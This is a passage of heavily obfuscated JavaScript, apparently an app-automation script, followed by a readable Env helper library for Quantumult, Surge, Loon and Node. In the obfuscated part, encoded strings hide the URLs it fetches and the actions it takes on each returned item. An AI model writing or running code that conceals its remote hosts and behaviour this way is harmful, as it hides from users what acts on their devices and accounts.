_0x2db00b={'laNHy':function(_0x3a3421){return _0x3a3421();},'alLqf':function(_0x1e4db1,_0x4c1110){return _0x1e4db1!==_0x4c1110;},'WeZiO':function(_0xbc2674,_0x1e477e){return _0xbc2674<_0x1e477e;},'OzopN':function(_0x4e10f1,_0x1ba656){return _0x4e10f1===_0x1ba656;},'aMBnT':_0x2abe('95','[92c'),'fhcGT':_0x2abe('96','z8va'),'WrnJm':function(_0x30a74b,_0x841bc1){return _0x30a74b(_0x841bc1);},'IgqDj':_0x2abe('97','3N]z'),'wecjN':_0x2abe('98','QWve')};return new Promise(_0x3c1fad=>{$[_0x2abe('99','QImQ')]({'url':_0x2db00b[_0x2abe('9a','Q38!')],'headers':{'User-Agent':_0x2db00b[_0x2abe('9b','ElJP')]}},async(_0x2a27bb,_0x270cb7,_0x44a5d0)=>{try{if(_0x2a27bb){console[_0x2abe('9c','@HE7')]($[_0x2abe('9d','$BHD')]+_0x2abe('9e','19J6'));}else{$[_0x2abe('9f','@Q]#')]=JSON[_0x2abe('a0','avaC')](_0x44a5d0);await _0x2db00b[_0x2abe('a1','u4CK')](shuye73);if(_0x2db00b[_0x2abe('a2','@HE7')]($[_0x2abe('a3','kEwv')][_0x2abe('a4','YISo')][_0x2abe('a5','pi7B')],0x0)){for(let _0x5120e1=0x0;_0x2db00b[_0x2abe('a6','3N]z')](_0x5120e1,$[_0x2abe('a7','cIlM')][_0x2abe('a8','QWve')][_0x2abe('a9','dDYx')]);_0x5120e1++){if(_0x2db00b[_0x2abe('aa','sO7%')](_0x2db00b[_0x2abe('ab','QImQ')],_0x2db00b[_0x2abe('ac','NC7g')])){$[_0x2abe('ad','G&4J')](e);}else{let _0x4bb916=$[_0x2abe('ae','oPtq')][_0x2abe('af','kbBT')][_0x5120e1];await $[_0x2abe('b0','8CEm')](0x1f4);await _0x2db00b[_0x2abe('b1','G&4J')](wuzhi,_0x4bb916);}}await _0x2db00b[_0x2abe('b2','RfGa')](shuye74);}}}catch(_0x4f7f07){$[_0x2abe('b3','NC7g')](_0x4f7f07);}finally{_0x2db00b[_0x2abe('b4','MVCW')](_0x3c1fad);}});});}function shuye73(){var _0x56072c={'uVECb':function(_0x3fde6b,_0x33ee50){return _0x3fde6b===_0x33ee50;},'Golez':_0x2abe('b5','[92c'),'JVnya':_0x2abe('b6','G&4J'),'FxlPI':function(_0x4809ea){return _0x4809ea();},'ApYyF':function(_0x5bca56,_0x3e41df){return _0x5bca56===_0x3e41df;},'MAELl':_0x2abe('b7','dDYx'),'EtsFR':_0x2abe('b8','Q38!'),'MxXJm':_0x2abe('b9','4Ov)')};return new Promise(_0x439cd1=>{if(_0x56072c[_0x2abe('ba','G&4J')](_0x56072c[_0x2abe('bb','cIlM')],_0x56072c[_0x2abe('bc','u4CK')])){$[_0x2abe('bd','5m$f')]({'url':_0x56072c[_0x2abe('be','QWve')],'headers':{'User-Agent':_0x56072c[_0x2abe('bf','WmqK')]}},async(_0x1352bf,_0x52147f,_0x4d3184)=>{try{if(_0x1352bf){console[_0x2abe('c0','gI6r')]($[_0x2abe('c1','ElJP')]+_0x2abe('c2','Q38!'));}else{$[_0x2abe('c3','dDYx')]=JSON[_0x2abe('5f','NC7g')](_0x4d3184);$[_0x2abe('c4','*AZu')]=$[_0x2abe('c5','sO7%')][_0x2abe('c6','Wg4j')];}}catch(_0x23b489){$[_0x2abe('c7','Gm2o')](_0x23b489);}finally{if(_0x56072c[_0x2abe('c8','kgQL')](_0x56072c[_0x2abe('c9','cgcL')],_0x56072c[_0x2abe('ca','pi7B')])){$[_0x2abe('cb','oPtq')](e);}else{_0x56072c[_0x2abe('cc','8CEm')](_0x439cd1);}}});}else{$[_0x2abe('cd','19J6')](e);}});}function shuye74(){var _0x35fb6c={'JWrta':function(_0x4f6114){return _0x4f6114();},'gYiIP':function(_0xec382d,_0x2a49b7){return _0xec382d!==_0x2a49b7;},'GQPPk':_0x2abe('ce','3N]z'),'VbpsM':_0x2abe('cf','avaC'),'qrygi':function(_0x35fc5e,_0x5b0182){return _0x35fc5e(_0x5b0182);},'eYpMO':function(_0x2790f9,_0x3f6203){return _0x2790f9===_0x3f6203;},'AUNFT':_0x2abe('d0','z8va'),'WzmpX':function(_0x4f4d14,_0x3beae6){return _0x4f4d14<_0x3beae6;},'bFTdK':_0x2abe('d1','zyL4'),'LqNRM':_0x2abe('d2','dDYx')};return new Promise(_0x345b7f=>{var _0xbf86da={'DCxYh':function(_0x3f670){return _0x35fb6c[_0x2abe('d3','avaC')](_0x3f670);},'zqGau':function(_0x40627c,_0x1ac788){return _0x35fb6c[_0x2abe('d4','WmqK')](_0x40627c,_0x1ac788);},'nrBbe':_0x35fb6c[_0x2abe('d5','bdB[')],'zJKkZ':function(_0x3e7717,_0x2c700e){return _0x35fb6c[_0x2abe('d6','MVCW')](_0x3e7717,_0x2c700e);},'YBmAI':_0x35fb6c[_0x2abe('d7','kEwv')],'kHEUp':function(_0x844fcd,_0x1a8484){return _0x35fb6c[_0x2abe('d8','$BHD')](_0x844fcd,_0x1a8484);},'wwVFE':function(_0x448ed0,_0x2b16d9){return _0x35fb6c[_0x2abe('d9','MVCW')](_0x448ed0,_0x2b16d9);},'lfhcR':_0x35fb6c[_0x2abe('da','QImQ')],'xqQjp':function(_0x547ff2,_0x185420){return _0x35fb6c[_0x2abe('db','sO7%')](_0x547ff2,_0x185420);}};$[_0x2abe('dc','MVCW')]({'url':_0x35fb6c[_0x2abe('dd','QWve')],'headers':{'User-Agent':_0x35fb6c[_0x2abe('de','3N]z')]}},async(_0xe36ee2,_0x15c23f,_0x55ebee)=>{var _0x348cd3={'vbqYW':function(_0x1abe47){return _0xbf86da[_0x2abe('df','RfGa')](_0x1abe47);}};try{if(_0xe36ee2){if(_0xbf86da[_0x2abe('e0','YISo')](_0xbf86da[_0x2abe('e1','i^V0')],_0xbf86da[_0x2abe('e2','^UIu')])){$[_0x2abe('e3','9!fw')]=JSON[_0x2abe('e4','tE)9')](_0x55ebee);$[_0x2abe('e5','zomv')]=$[_0x2abe('e6','i^V0')][_0x2abe('e7','9!fw')];}else{console[_0x2abe('e8','NC7g')]($[_0x2abe('e9','MVCW')]+_0x2abe('ea','(T!!'));}}else{if(_0xbf86da[_0x2abe('eb','tE)9')](_0xbf86da[_0x2abe('ec','avaC')],_0xbf86da[_0x2abe('ed','8CEm')])){_0x348cd3[_0x2abe('ee','@HE7')](_0x345b7f);}else{if(_0xbf86da[_0x2abe('ef','u4CK')](safeGet,_0x55ebee)){if(_0xbf86da[_0x2abe('f0','cIlM')](_0xbf86da[_0x2abe('f1','^UIu')],_0xbf86da[_0x2abe('f2','Gm2o')])){$[_0x2abe('f3','Wg4j')]=JSON[_0x2abe('f4','kbBT')](_0x55ebee);if(_0xbf86da[_0x2abe('f5','dDYx')]($[_0x2abe('f6','(T!!')][_0x2abe('f7','19J6')],0x0)){for(let _0x184280=0x0;_0xbf86da[_0x2abe('f8','l!]C')](_0x184280,$[_0x2abe('f9','3N]z')][_0x2abe('fa','3N]z')][_0x2abe('fb','MVCW')]);_0x184280++){let _0x18c197=$[_0x2abe('fc','NC7g')][_0x2abe('fd','gI6r')][_0x184280];await $[_0x2abe('fe','*AZu')](0x1f4);await _0xbf86da[_0x2abe('ff','MVCW')](wuzhi01,_0x18c197);}}}else{_0x55ebee=JSON[_0x2abe('100','WmqK')](_0x55ebee);}}}}}catch(_0x1940d2){$[_0x2abe('101','z8va')](_0x1940d2);}finally{_0xbf86da[_0x2abe('102','[92c')](_0x345b7f);}});});};_0xodY='jsjiami.com.v6';
// prettier-ignore
function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}